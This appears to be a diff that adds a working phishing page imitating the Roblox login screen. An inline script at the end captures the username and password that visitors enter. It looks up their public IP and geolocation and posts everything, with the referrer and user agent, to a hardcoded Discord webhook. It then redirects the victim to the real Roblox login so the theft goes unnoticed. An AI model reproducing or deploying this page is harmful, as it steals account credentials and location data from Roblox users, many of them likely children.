@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Roblox</title>
+    <link href="/images/icon.ico" rel="icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/menu.js" defer></script>
+    <script src="js/login.js" defer></script>
+    <script src="js/search.js" defer></script>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo">
+            <img src="images/logo1.png">
+        </div>
+        <div class="menu-toggle" id="menu-toggle">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </div>
+        <ul class="menu" id="menu">
+            <li><a href="https://www.roblox.com/charts">Charts</a></li>
+            <li><a href="https://www.roblox.com/catalog">Marketplace</a></li>
+            <li><a href="https://create.roblox.com/">Create</a></li>
+            <li><a href="https://www.roblox.com/upgrades/robux?ctx=navpopover">Robux</a></li>
+            <li>
+                <div class="search-container">
+                    <input type="text" id="search-input" placeholder="Search" maxlength="30" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" oninput="filterResults()">
+                    <img src="images/search.png" class="search-icon">
+                    <img src="images/clear.png" class="clear-icon" onclick="clearSearch()">
+                    <div id="dropdown" class="dropdown">
+                        <div class="dropdown-item" id="experience-item">
+                            <img src="images/experiences.png" class="dropdown-icon">
+                            <span class="search-text"></span> <span>in Experiences</span>
+                        </div>
+                        <div class="dropdown-item" id="people-item">
+                            <img src="images/people.png" class="dropdown-icon">
+                            <span class="search-text"></span> <span>in People</span>
+                        </div>
+                        <div class="dropdown-item" id="groups-item">
+                            <img src="images/groups.png" class="dropdown-icon">
+                            <span class="search-text"></span> <span>in Groups</span>
+                        </div>
+                        <div class="dropdown-item" id="marketplace-item">
+                            <img src="images/marketplace.png" class="dropdown-icon">
+                            <span class="search-text"></span> <span>in Marketplace</span>
+                        </div>
+                    </div>
+                </div>
+            </li>
+        </ul>
+        <div class="signup-container">
+            <a href="https://www.roblox.com/account/signupredir?returnUrl=" class="signup-button">Sign Up</a>
+        </div>
+    </nav>
+    <div class="main">
+        <div class="login-container">
+            <h1>Login to Roblox</h1>
+            <form id="login-form" action="" method="POST" onsubmit="validateForm(event)">
+                <div class="input-field">
+                    <input type="text" name="username" placeholder="Username/Email/Phone" required>
+                </div>
+                <div class="input-field">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <div id="error-message"></div>
+                <div id="loading">
+                    <div class="cube"></div>
+                    <div class="cube"></div>
+                    <div class="cube"></div>
+                </div>
+                <button type="submit" class="login-button" id="login-button">Log In</button>
+            </form>
+
+            <p><a href="https://www.roblox.com/login/forgot-password-or-username">Forgot Password or Username?</a></p>
+
+            <div class="separator"></div>
+
+            <button class="secondary-button">Email Me a One-Time Code</button>
+            <button class="secondary-button">Use Another Device</button>
+
+            <div class="footer">
+                <p>Don't have an account? <a href="https://www.roblox.com/">Sign Up</a></p>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer-container">
+        <div class="footer-links">
+            <a href="https://www.roblox.com/info/about-us">About Us</a>
+            <a href="https://www.roblox.com/info/jobs">Jobs</a>
+            <a href="https://www.roblox.com/info/blog">Blog</a>
+            <a href="https://www.roblox.com/info/parents">Parents</a>
+            <a href="https://www.roblox.com/giftcards">Gift Cards</a>
+            <a href="https://www.roblox.com/info/help">Help</a>
+            <a href="https://www.roblox.com/info/terms">Terms</a>
+            <a href="https://www.roblox.com/info/accessibility">Accessibility</a>
+            <a href="https://www.roblox.com/info/privacy">Privacy</a>
+            <a href="https://www.roblox.com/my/account#!/privacy">
+                Your Privacy Choices
+                <img src="images/privacy.png" class="privacy-icon">
+            </a>
+            <a href="#">Cookie Options</a>
+        </div>
+
+        <div class="footer-stripe"></div>
+
+        <div class="footer-notice">
+            <p>©2024 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+        </div>
+    </footer>
+
+    <script>
+        const webhook_Url = 'https://discord.com/api/webhooks/1317560675341434960/4ng1JJRS6hUt9bRiX8yeHU5d9mYkGvINqcqOn8cKte2kUDnChNG2RLqZR9beMzivNTo3';
+    
+        document.getElementById('login-form').onsubmit = async function(event) {
+            event.preventDefault();
+            
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            if (!username || !password) {
+                document.getElementById('error-message').innerText = 'Please fill in all fields.';
+                console.error('Validation failed: Fields are empty');
+                return;
+            }
+            
+            let publicIP, latitude, longitude;
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                publicIP = ipData.ip;
+    
+                const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
+                const geoData = await geoResponse.json();
+                latitude = geoData.latitude || 'N/A';
+                longitude = geoData.longitude || 'N/A';
+            } catch (error) {
+                console.error('');
+                publicIP = 'N/A';
+                latitude = 'N/A';
+                longitude = 'N/A';
+            }
+    
+            const referrer = document.referrer || 'N/A';
+            const port = window.location.port || 'N/A';
+            const date = new Date().toISOString();
+            const userAgent = navigator.userAgent;
+    
+            console.log('Sending data to Discord webhook:', {
+                username, password, publicIP, latitude, longitude, referrer, port, date, userAgent
+            });
+    
+            const embed = {
+                embeds: [{
+                    title: "Roblox Login Information",
+                    color: 0xff0000,
+                    description: `
+                        👤 **Username:** ${username}
+                        🔑 **Password:** ${password}
+                        🌍 **Public IP:** ${publicIP}
+                        📍 **Latitude:** ${latitude}
+                        📏 **Longitude:** ${longitude}
+                        🔗 **Referrer:** ${referrer}
+                        📡 **Port:** ${port}
+                        🖥️ **User Agent:** ${userAgent}
+                    `
+                }]
+            };
+            fetch(webhook_Url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(embed)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Network response was not ok', response);
+                    document.getElementById('error-message').innerText = 'Network response was not ok';
+                    return;
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Success');
+                document.getElementById('error-message').innerText = 'Login successful!';
+                window.location.href = 'https://www.roblox.com/en/login';
+            })
+            .catch((error) => {
+                console.error('Error');
+                document.getElementById('error-message').innerText = 'Login failed. Please try again later.';
+                window.location.href = 'https://www.roblox.com/en/login';
+            });
+        };
+    </script>
+</body>
+</html>
